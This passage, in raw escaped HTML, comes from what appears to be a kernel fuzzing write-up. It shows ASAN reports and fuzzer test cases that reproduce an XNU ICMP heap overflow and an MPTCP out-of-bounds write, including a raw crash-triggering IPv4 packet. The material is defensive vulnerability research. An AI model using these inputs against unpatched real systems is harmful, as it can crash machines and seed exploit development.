class="c17"&gt;#define&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;INP_IS_FLOW_CONTROLLED&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;_inp_&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;\&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;_inp_&lt;/span&gt;&lt;span class="c1"&gt;)-&amp;gt;&lt;/span&gt;&lt;span class="c0"&gt;inp_flags &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;INP_FLOW_CONTROLLED&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.14k82770mpb"&gt;&lt;span class="c7 c2"&gt;Checking Our Work: Reproducing the Sample Bugs&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;With most of the necessary supporting code implemented, we can fuzz for a while without hitting any assertions due to unimplemented stubbed functions. At this stage, I reverted the fixes for the two inspiration bugs I mentioned at the beginning of this article. Here&amp;rsquo;s what we see shortly after we run the fuzzer with those fixes reverted:&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b2722f59e62293fbbc44bd59d6442b0f062757f2"&gt;&lt;/a&gt;&lt;a id="t.29"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;1633983&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;ERROR&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;AddressSanitizer&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;heap&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;buffer&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;overflow on address &lt;/span&gt;&lt;span class="c3"&gt;0x61d00029f474&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;at pc &lt;/span&gt;&lt;span class="c3"&gt;0x00000049fcb7&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;bp &lt;/span&gt;&lt;span class="c3"&gt;0x7ffcddc88590&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;sp &lt;/span&gt;&lt;span class="c3"&gt;0x7ffcddc87d58&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;WRITE of size &lt;/span&gt;&lt;span class="c3"&gt;20&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;at &lt;/span&gt;&lt;span class="c3"&gt;0x61d00029f474&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;thread T0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#0 0x49fcb6 in __asan_memmove /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:30:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#1 0x7ff64bd83bd9 in __asan_bcopy fuzz/san.c:37:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#2 0x7ff64ba9e62f in icmp_error bsd/netinet/ip_icmp.c:362:2&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#3 0x7ff64baaff9b in ip_dooptions bsd/netinet/ip_input.c:3577:2&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#4 0x7ff64baa921b in ip_input bsd/netinet/ip_input.c:2230:34&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#5 0x7ff64bd7d440 in ip_input_wrapper fuzz/backend.c:132:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x4dbe29 in DoIpInput fuzz/net_fuzzer.cc:610:7&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#7 0x4de0ef in TestOneProtoInput(Session const&amp;amp;) fuzz/net_fuzzer.cc:720:9&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c3"&gt;0x61d00029f474&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;is&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;located &lt;/span&gt;&lt;span class="c3"&gt;12&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;bytes to the left of &lt;/span&gt;&lt;span class="c3"&gt;2048&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c6"&gt;byte&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;region &lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c3"&gt;0x61d00029f480&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;0x61d00029fc80&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;allocated &lt;/span&gt;&lt;span class="c6"&gt;by&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;thread T0 here&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#0 0x4a0479 in calloc /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:154:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#1 0x7ff64bd82b20 in mbuf_create fuzz/zalloc.c:157:45&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#2 0x7ff64bd8319e in mcache_alloc fuzz/zalloc.c:187:12&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#3 0x7ff64b69ae84 in m_getcl bsd/kern/uipc_mbuf.c:3962:6&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#4 0x7ff64ba9e15c in icmp_error bsd/netinet/ip_icmp.c:296:7&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#5 0x7ff64baaff9b in ip_dooptions bsd/netinet/ip_input.c:3577:2&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x7ff64baa921b in ip_input bsd/netinet/ip_input.c:2230:34&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#7 0x7ff64bd7d440 in ip_input_wrapper fuzz/backend.c:132:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#8 0x4dbe29 in DoIpInput fuzz/net_fuzzer.cc:610:7&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#9 0x4de0ef in TestOneProtoInput(Session const&amp;amp;) fuzz/net_fuzzer.cc:720:9&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;When we inspect the test case, we see that a single raw IPv4 packet was generated to trigger this bug. This is to be expected, as the bug doesn&amp;rsquo;t require an existing connection, and looking at the stack, we can see that the test case triggered the bug in the IPv4-specific &lt;/span&gt;&lt;span class="c9"&gt;ip_input&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;path.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e5f0cef3123c406738ed1868e0c2fa3f334081f3"&gt;&lt;/a&gt;&lt;a id="t.30"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; ip_input &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; raw_ip4&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;M\001\000I\001\000\000\000\000\000\000\000III\333\333\333\333\333\333\333\333\333\333IIIIIIIIIIIIII\000\000\000\000\000III\333\333\333\333\333\333\333\333\333\333\333\333IIIIIIIIIIIIII&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;data_provider&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;If we fix that issue and fuzz a bit longer, we soon see another crash, this time in the MPTCP stack. This is Ian&amp;rsquo;s MPTCP vulnerability. The ASAN report looks strange though. Why is it crashing during garbage collection in &lt;/span&gt;&lt;span class="c9"&gt;mptcp_session_destroy&lt;/span&gt;&lt;span class="c8 c2"&gt;? The original vulnerability was an OOB write, but ASAN couldn&amp;rsquo;t catch it because it corrupted memory within a struct. This is a well-known shortcoming of ASAN and similar mitigations, importantly the upcoming MTE. This means we don&amp;rsquo;t catch the bug until later, when a randomly corrupted pointer is accessed.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.38f4e091ebe11281f4c9363d7093c9f69ad01412"&gt;&lt;/a&gt;&lt;a id="t.31"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;1640571&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;ERROR&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;AddressSanitizer&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;attempting free on address which was &lt;/span&gt;&lt;span class="c6"&gt;not&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;malloc&lt;/span&gt;&lt;span class="c1"&gt;()-&lt;/span&gt;&lt;span class="c0"&gt;ed&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0x6190000079dc&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;thread T0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#0 0x4a0094 in free /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:123:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#1 0x7fbdfc7a16b0 in _FREE fuzz/zalloc.c:293:36&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#2 0x7fbdfc52b624 in mptcp_session_destroy bsd/netinet/mptcp_subr.c:742:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#3 0x7fbdfc50c419 in mptcp_gc bsd/netinet/mptcp_subr.c:4615:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#4 0x7fbdfc4ee052 in mp_timeout bsd/netinet/mp_pcb.c:118:16&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#5 0x7fbdfc79b232 in clear_all fuzz/backend.c:83:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x4dfd5c in TestOneProtoInput(Session const&amp;amp;) fuzz/net_fuzzer.cc:1010:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c3"&gt;0x6190000079dc&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;is&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;located &lt;/span&gt;&lt;span class="c3"&gt;348&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;bytes inside of &lt;/span&gt;&lt;span class="c3"&gt;920&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c6"&gt;byte&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;region &lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c3"&gt;0x619000007880&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;0x619000007c18&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;allocated &lt;/span&gt;&lt;span class="c6"&gt;by&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;thread T0 here&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#0 0x4a0479 in calloc /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:154:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#1 0x7fbdfc7a03d4 in zalloc fuzz/zalloc.c:37:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#2 0x7fbdfc4ee710 in mp_pcballoc bsd/netinet/mp_pcb.c:222:8&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#3 0x7fbdfc53cf8a in mptcp_attach bsd/netinet/mptcp_usrreq.c:211:15&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#4 0x7fbdfc53699e in mptcp_usr_attach bsd/netinet/mptcp_usrreq.c:128:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#5 0x7fbdfc0e1647 in socreate_internal bsd/kern/uipc_socket.c:784:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x7fbdfc0e23a4 in socreate bsd/kern/uipc_socket.c:871:9&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#7 0x7fbdfc118695 in socket_common bsd/kern/uipc_syscalls.c:266:11&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#8 0x7fbdfc1182d1 in socket bsd/kern/uipc_syscalls.c:214:9&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#9 0x7fbdfc79a26e in socket_wrapper fuzz/syscall_wrappers.c:371:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#10 0x4dd275 in TestOneProtoInput(Session const&amp;amp;) fuzz/net_fuzzer.cc:655:19&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Here&amp;rsquo;s the protobuf input for the crashing testcase:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f691b70570e755735734b5e1a4200a505811568b"&gt;&lt;/a&gt;&lt;a id="t.32"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; socket &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; domain&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; so_type&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;SOCK_STREAM&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; protocol&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IPPROTO_IP&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; connectx &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; socket&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;FD_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; endpoints &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_srcif&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IFIDX_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_srcaddr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sockaddr_generic &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_family&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quotamp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_dstaddr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sockaddr_generic &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_family&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;AF_MULTIPATH&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sa_data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; associd&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;ASSOCID_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_IDEMPOTENT&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_IDEMPOTENT&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;CONNECT_DATA_IDEMPOTENT&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;commands &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; connectx &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; socket&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;FD_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; endpoints &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_srcif&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IFIDX_CASE_0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sae_dstaddr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sockaddr_generic 